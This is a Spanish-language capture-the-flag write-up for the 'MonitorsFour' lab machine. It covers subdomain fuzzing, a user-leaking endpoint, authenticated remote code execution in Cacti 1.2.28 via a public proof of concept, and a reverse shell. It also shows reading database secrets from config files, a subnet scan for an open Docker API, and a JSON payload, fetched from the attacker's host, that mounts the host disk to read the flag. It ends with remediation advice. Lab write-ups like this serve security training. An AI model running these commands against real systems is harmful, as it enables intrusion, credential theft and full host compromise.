---
layout: single
classes: wide
title: "MonitorsFour - Writeup"
date: 2026-05-21
difficulty: FÃ¡cil
operating_system: Windows
service_hint: Cacti + CVE-2025-24367 + Docker API
tags:
  - CVE-2025-24367
  - CVE-2025-9074
  - Cacti
  - Docker API
  - RCE
  - Privilege Escalation
  - FÃ¡cil
summary: "Cadena de explotaciÃ³n: fuzzing de subdominios descubre Cacti 1.2.28, endpoint web filtra credenciales de usuario, y CVE-2025-24367 proporciona RCE autenticado como www-data. Desde el contenedor se abusa de la Docker API expuesta en la red interna para montar el filesystem del host y leer la flag de Administrador."
---

## InformaciÃ³n general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Windows |
| Dificultad | FÃ¡cil |
| Tags | `CVE-2025-24367`, `CVE-2025-9074`, `Cacti`, `Docker API`, `RCE`, `Privilege Escalation` |
{: .info-table}

## Reconocimiento

Empezamos con un escaneo completo de puertos para descubrir los servicios expuestos en la mÃ¡quina Windows. QuerÃ­amos identificar todos los puntos de entrada disponibles antes de profundizar.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.1.174 -oG allPorts
```

Con los puertos identificados, hicimos un escaneo mÃ¡s detallado con scripts de servicio para obtener versiones, banners y confirmar los fingerprints.

```bash
nmap -p80,5985 -sCV 10.129.1.174 -oN targeted
```

Los indicadores clave de esta fase fueron:

- `80/tcp` expone **nginx** con PHP 8.3.27 y redirige a `monitorsfour.htb`.
- `5985/tcp` confirma WinRM accesible, Ãºtil para acceso posterior con credenciales vÃ¡lidas.

## EnumeraciÃ³n

Una vez agregado el dominio al `/etc/hosts`, identificamos las tecnologÃ­as del sitio con WhatWeb para saber con quÃ© frameworks y servidores estamos tratando antes de profundizar en la enumeraciÃ³n.

```bash
whatweb http://monitorsfour.htb/
```

Fuzzeamos directorios con feroxbuster para descubrir rutas ocultas dentro de la aplicaciÃ³n web que no son accesibles desde la navegaciÃ³n normal.

```bash
feroxbuster -u http://monitorsfour.htb -t 50
```

Buscamos subdominios adicionales con wfuzz, que fue clave para encontrar el panel de Cacti escondido y el resto de servicios virtuales del dominio.

```bash
wfuzz -H "Host: FUZZ.monitorsfour.htb" --hc 404,403 -c --hh 138 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://monitorsfour.htb
```

El hallazgo crÃ­tico fue el subdominio `cacti.monitorsfour.htb`, que expone una instalaciÃ³n de **Cacti versiÃ³n 1.2.28**.

## MetodologÃ­a de anÃ¡lisis del vector inicial

El vector de entrada se priorizÃ³ en el subdominio `cacti.monitorsfour.htb` porque la versiÃ³n 1.2.28 de Cacti tiene vulnerabilidades RCE autenticadas conocidas. El endpoint `/user?token=0` encontrado en el sitio principal filtraba informaciÃ³n de usuarios sin autenticaciÃ³n, proporcionando nombres de cuenta potenciales para acceder a Cacti.

La presencia de un dump SQL accesible pÃºblicamente en la instalaciÃ³n de Cacti permitiÃ³ obtener hashes de contraseÃ±a, y la funcionalidad de subida de plantillas en Cacti proporcionaba el vector para convertir acceso autenticado en ejecuciÃ³n remota de cÃ³digo.

## InvestigaciÃ³n de vulnerabilidades

Dos CVEs documentadas guiaron la fase de investigaciÃ³n:

- **CVE-2025-24367**: Vulnerabilidad de RCE autenticada en Cacti que permite a un usuario con acceso al panel subir una plantilla maliciosa que ejecuta cÃ³digo PHP en el servidor, proporcionando una shell en el contenedor web.
- **CVE-2025-9074**: Vulnerabilidad crÃ­tica (CVSS 9.3) en Docker Desktop que expone la Docker API sin autenticaciÃ³n en la subred interna `192.168.65.0/24`, permitiendo a cualquier contenedor Linux crear contenedores privilegiados con montajes del sistema de archivos del host.

![Panel de login de Cacti 1.2.28](/images/writeups/monitorsfour/Pasted image 20260521120236.png)

Descargamos el dump SQL de Cacti que estÃ¡ accesible pÃºblicamente desde la instalaciÃ³n. Los dumps de instalaciÃ³n suelen contener credenciales por defecto que podemos aprovechar si no fueron cambiadas.

```bash
curl -s http://cacti.monitorsfour.htb/cacti/cacti.sql -o cacti.sql
```

Buscamos en el dump las sentencias INSERT INTO user para encontrar los usuarios y sus hashes de contraseÃ±a. AsÃ­ identificamos las cuentas predefinidas de Cacti.

```bash
grep -i "INSERT INTO user" -n cacti.sql
```

Encontramos el hash MD5 del usuario `admin` (`21232f297a57a5a743894a0e4a801fc3`) que corresponde a `admin`, pero la contraseÃ±a ya habÃ­a sido cambiada en el sistema activo.

## ExplotaciÃ³n

Durante la enumeraciÃ³n web descubrimos un endpoint `/user?token=0` que filtra informaciÃ³n de usuarios sin necesidad de autenticaciÃ³n. Consultamos el listado completo de usuarios para obtener nombres y roles.

```bash
curl http://monitorsfour.htb/user?token=0
```

El endpoint devolviÃ³ los siguientes usuarios:

| Username | Rol | Nombre |
|----------|-----|--------|
| `admin` | super user | Marcus Higgins |
| `mwatson` | user | Michael Watson |
| `janderson` | user | Jennifer Anderson |
| `dthompson` | user | David Thompson |

El nombre real de `admin` era **Marcus Higgins**, lo que sugerÃ­a que el usuario local `marcus` podÃ­a existir en el sistema. Probamos credenciales contra Cacti y el usuario `marcus` con contraseÃ±a `[REDACTED]` funcionÃ³.

Cacti 1.2.28 tiene una vulnerabilidad RCE autenticada conocida como CVE-2025-24367. Clonamos un PoC pÃºblico para explotarla y obtener acceso al contenedor.

```bash
git clone https://github.com/SoftAndoWetto/CVE-2025-24367-PoC-Cacti.git
```

Con las credenciales de marcus apuntando a nuestra IP, ejecutamos el exploit para que suba un payload PHP mediante manipulaciÃ³n de plantillas y nos devuelva una shell reversa desde el contenedor Cacti.

```bash
python3 exploit.py
```

Abrimos un listener en el puerto 4444 para recibir la shell reversa que el exploit va a disparar desde el contenedor Cacti.

```bash
nc -nlvp 4444
```

```bash
connect to [10.10.14.150] from (UNKNOWN) [10.129.2.62] 65007
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$
```

Una vez dentro del contenedor, buscamos credenciales en los archivos de configuraciÃ³n clave. Primero revisamos el `.env` de la aplicaciÃ³n, que suele contener credenciales de base de datos y otros secretos.

```bash
www-data@821fbd6a43fa:~/html/cacti$ cat /var/www/app/.env
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=[REDACTED]
```

Seguimos con el archivo de configuraciÃ³n principal de Cacti. Primero filtramos por "user" para localizar las lÃ­neas de credenciales de la base de datos.

```bash
www-data@821fbd6a43fa:~/html/cacti$ cat /var/www/html/cacti/include/config.php | grep user
```

TambiÃ©n revisamos los archivos de configuraciÃ³n de Cacti para encontrar las credenciales de su propia base de datos MySQL. Con la contraseÃ±a obtenida nos conectamos a MariaDB para explorar las tablas internas del sistema.

```bash
www-data@821fbd6a43fa:~/html/cacti$ grep -Ei "user|pass|host|database|db_|mysql|mysqli|port" /var/www/html/cacti/include/config.php
```

```bash
www-data@821fbd6a43fa:~/html/cacti$ mysql -h mariadb -u cactidbuser -p
Enter password:
```

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> USE cacti;

MariaDB [cacti]> SELECT id,username,password FROM user_auth;
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
|  1 | admin    | $2y$10$wqlo06C4isr4q9xhqI/UQOpyM/n8EDzYl/GndqhDh/2LQihzPdHWO |
|  3 | guest    | 43e9a4ab75570f5b                                             |
|  4 | marcus   | $2y$10$bPWlnZYLhoDUawu4x8vLAuCIaDbqIUe4s9t9HqFm/1gtbavD/eKGe |
+----+----------+--------------------------------------------------------------+
```

## Escalada de privilegios

Desde el contenedor no tenemos acceso directo al host Windows, pero podemos explorar la red interna de Docker. Creamos un script que escanea la subred 192.168.65.0/24 buscando la Docker API expuesta sin autenticaciÃ³n en el puerto 2375.

```bash
www-data@821fbd6a43fa:/tmp$ cat << 'EOF' > scan.sh
for i in $(seq 1 254); do
  ip="192.168.65.$i"
  timeout 1 bash -c "
    curl -s http://$ip:2375/version | grep -q 'ApiVersion'
  " 2>/dev/null && echo "[+] Docker API OPEN: $ip:2375"
done
EOF
```

Damos permisos de ejecuciÃ³n al script y lo lanzamos. Escanea toda la subred y encuentra la Docker API abierta sin autenticaciÃ³n en 192.168.65.7:2375.

```bash
www-data@821fbd6a43fa:/tmp$ chmod +x scan.sh
www-data@821fbd6a43fa:/tmp$ ./scan.sh
[+] Docker API OPEN: 192.168.65.7:2375
```

El host `192.168.65.7:2375` tiene la Docker API expuesta sin autenticaciÃ³n. Esta exposiciÃ³n se debe al **CVE-2025-9074**, una vulnerabilidad crÃ­tica (CVSS 9.3) en Docker Desktop que permite a cualquier contenedor Linux acceder al motor Docker a travÃ©s de la subred interna `192.168.65.0/24` sin necesidad de montar el socket de Docker, posibilitando la creaciÃ³n de contenedores privilegiados que montan el sistema de archivos del host. Listamos las imÃ¡genes disponibles en el motor Docker para identificar quÃ© contenedores existen y cuÃ¡l podemos usar como base para montar el sistema de archivos del host.

```bash
www-data@821fbd6a43fa:/tmp$ curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
"RepoTags":["docker_setup-nginx-php:latest"]
"RepoTags":["docker_setup-mariadb:latest"]
"RepoTags":["alpine:latest"]
```

Preparamos un payload JSON que define un contenedor Alpine con el sistema de archivos del host montado en `/mnt/host_root`. El comando del contenedor lee directamente la flag de Administrador desde el disco montado.

```bash
www-data@821fbd6a43fa:/tmp$ nano payload.json
```

```json
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
```

Levantamos un servidor HTTP en nuestra mÃ¡quina atacante para que el contenedor vÃ­ctima pueda descargar el payload JSON.

```bash
python3 -m http.server 8000
```

Desde el contenedor vÃ­ctima, descargamos el payload JSON usando curl apuntando a nuestro servidor HTTP atacante.

```bash
www-data@821fbd6a43fa:/tmp$ curl http://10.10.14.150:8000/payload.json -o /tmp/payload.json
```

Enviamos el payload JSON a la Docker API para crear un contenedor Alpine que monte el disco del host. La API nos devuelve el ID del contenedor creado, lo que confirma que el motor aceptÃ³ la solicitud.

```bash
www-data@821fbd6a43fa:/tmp$ curl -X POST -H "Content-Type: application/json" -d @/tmp/payload.json http://192.168.65.7:2375/containers/create?name=pwned
{"Id":"20dd4fc655bd666d5207249c937cbe951107cdd5b68b7f89e67feafe354731d4","Warnings":[]}
```

Iniciamos el contenedor con el endpoint `/start`. Al arrancar, ejecuta el comando que definimos en el payload: montar el disco del host y leer la flag de root.

```bash
www-data@821fbd6a43fa:/tmp$ curl -X POST http://192.168.65.7:2375/containers/20dd4fc655bd/start
```

Consultamos los logs del contenedor con el endpoint `/logs`. La salida contiene la flag de root que el contenedor extrajo del sistema de archivos del host montado.

```bash
www-data@821fbd6a43fa:/tmp$ curl http://192.168.65.7:2375/containers/20dd4fc655bd/logs?stdout=true
[REDACTED]
```

**Flag de root:** `[REDACTED]`

## Cadena de explotaciÃ³n

```text
Fuzzing de subdominios
-> cacti.monitorsfour.htb (Cacti 1.2.28)
-> endpoint /user?token=0 filtra usuarios
-> credenciales de marcus
-> CVE-2025-24367 (RCE autenticado en Cacti)
-> shell como www-data en contenedor
-> escaneo de subred interna 192.168.65.0/24
-> Docker API expuesta en 192.168.65.7:2375 (CVE-2025-9074)
-> contenedor Alpine con montaje del host
-> lectura de root.txt desde disco del host
```

## Flags

| Flag | Valor |
|------|-------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `[REDACTED]` |

## Lecciones tÃ©cnicas

1. Un endpoint sin autenticaciÃ³n que filtra usuarios puede proporcionar los nombres de cuenta necesarios para ataques de fuerza bruta o reutilizaciÃ³n de credenciales en servicios internos.
2. Los dumps SQL de instalaciÃ³n nunca deben ser accesibles pÃºblicamente, ya que contienen hashes y configuraciones por defecto.
3. La Docker API expuesta sin autenticaciÃ³n en una subred interna equivale a compromiso total del host, ya que cualquier contenedor puede montar el sistema de archivos completo.
4. Las aplicaciones legacy como Cacti deben actualizarse o aislarse en redes separadas, especialmente cuando manejan credenciales de base de datos.

## ConclusiÃ³n

MonitorsFour resultÃ³ ser una mÃ¡quina de dificultad **FÃ¡cil** que combinÃ³ dos vectores: la explotaciÃ³n de Cacti 1.2.28 mediante **CVE-2025-24367** para obtener acceso a un contenedor web, y el abuso de una **Docker API expuesta sin autenticaciÃ³n** en la red interna para montar el sistema de archivos del host y leer la flag de Administrador. La lecciÃ³n principal es que exponer un panel de Cacti en una versiÃ³n vulnerable combinado con una API de Docker abierta convierte una intrusiÃ³n web limitada en compromiso total del sistema.

## RemediaciÃ³n

1. Actualizar Cacti a una versiÃ³n que parchee CVE-2025-24367 o migrar a una alternativa mÃ¡s segura.
2. Eliminar el endpoint `/user?token=0` o requerir autenticaciÃ³n para acceder a informaciÃ³n de usuarios.
3. No exponer dumps SQL de instalaciÃ³n en el directorio web pÃºblico.
4. Configurar la Docker API para requerir autenticaciÃ³n TLS y no exponerla en subredes accesibles desde contenedores no privilegiados.
5. Aplicar el parche de seguridad correspondiente a CVE-2025-9074 en Docker Desktop.
